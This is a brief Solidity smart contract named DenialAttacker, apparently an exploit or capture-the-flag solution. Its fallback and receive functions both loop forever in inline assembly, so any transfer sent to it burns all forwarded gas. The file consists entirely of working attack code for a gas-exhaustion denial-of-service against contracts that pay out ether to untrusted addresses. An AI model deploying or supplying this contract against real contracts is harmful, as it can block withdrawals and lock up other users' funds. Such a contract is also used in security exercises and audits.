// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract DenialAttacker {
    fallback() external payable {
        assembly {
            for { } 1 { } { }
        }
    }

    receive() external payable {
        assembly {
            for { } 1 { } { }
        }
    }
}
